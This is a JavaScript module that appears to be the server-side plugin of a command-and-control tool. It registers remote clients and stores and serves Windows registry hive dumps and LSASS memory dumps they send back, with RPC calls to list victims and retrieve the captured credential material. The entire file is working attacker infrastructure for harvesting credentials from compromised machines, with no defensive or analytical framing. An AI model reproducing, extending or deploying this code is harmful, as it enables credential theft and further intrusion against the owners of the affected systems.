function norm(payload) {
  if (payload == null) return {};
  if (typeof payload === "string") {
    try { return JSON.parse(payload); } catch { return { raw: payload }; }
  }
  if (payload instanceof Uint8Array || payload instanceof ArrayBuffer) {
    const s = new TextDecoder().decode(payload);
    try { return JSON.parse(s); } catch { return { raw: s }; }
  }
  return payload;
}

export default {
  setup(ctx) {
    ctx.clients = new Map();
    ctx.db.run(`
      CREATE TABLE IF NOT EXISTS dumps (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        kind TEXT NOT NULL,
        name TEXT,
        size INTEGER DEFAULT 0,
        data TEXT,
        path TEXT,
        captured_at INTEGER NOT NULL
      )`);
    ctx.db.run(`CREATE INDEX IF NOT EXISTS dumps_client ON dumps(client_id)`);
  },

  onEvent(ctx, clientId, event, payload) {
    if (!clientId) return;
    ctx.clients.set(clientId, Date.now());
    const p = norm(payload);
    const now = Date.now();

    if (event === "status") {
      ctx.broadcast("status", { clientId, ...p });
    } else if (event === "hive") {
      ctx.db.run(
        `INSERT INTO dumps (client_id, kind, name, size, data, path, captured_at) VALUES (?, ?, ?, ?, ?, ?, ?)`,
        clientId, "hive", p.name || "hive", p.size || 0, p.data || null, p.path || null, now
      );
      ctx.broadcast("hive", { clientId, name: p.name, size: p.size || 0, inline: !!p.data });
    } else if (event === "lsass") {
      ctx.db.run(
        `INSERT INTO dumps (client_id, kind, name, size, data, path, captured_at) VALUES (?, ?, ?, ?, ?, ?, ?)`,
        clientId, "lsass", "lsass.dmp", p.size || 0, null, p.path || null, now
      );
      ctx.broadcast("lsass", { clientId, path: p.path, size: p.size || 0, pid: p.pid || 0 });
    } else if (event === "priv") {
      ctx.broadcast("priv", { clientId, ...p });
    } else if (event === "error") {
      ctx.broadcast("error", { clientId, ...p });
    } else if (event === "pong") {
      ctx.broadcast("pong", { clientId, ...p });
    }
  },

  rpc: {
    list_clients(ctx) {
      return Array.from(ctx.clients.entries()).map(([clientId, lastSeen]) => ({ clientId, lastSeen }));
    },

    list_dumps(ctx, params = {}) {
      const rows = ctx.db
        .query(`SELECT id, client_id AS clientId, kind, name, size, path, captured_at,
                       (data IS NOT NULL) AS inline
                FROM dumps WHERE client_id = ? ORDER BY id DESC`)
        .all(params.clientId || "");
      return rows;
    },

    get_dump(ctx, params = {}) {
      const row = ctx.db.query(`SELECT name, data FROM dumps WHERE id = ?`).get(params.id);
      if (!row) throw new Error("dump not found");
      if (!row.data) throw new Error("dump was too large to inline — pull it via the file browser");
      return { name: row.name, data: row.data };
    },

    clear_dumps(ctx, params = {}) {
      ctx.db.run(`DELETE FROM dumps WHERE client_id = ?`, params.clientId || "");
      return { ok: true };
    },
  },
};
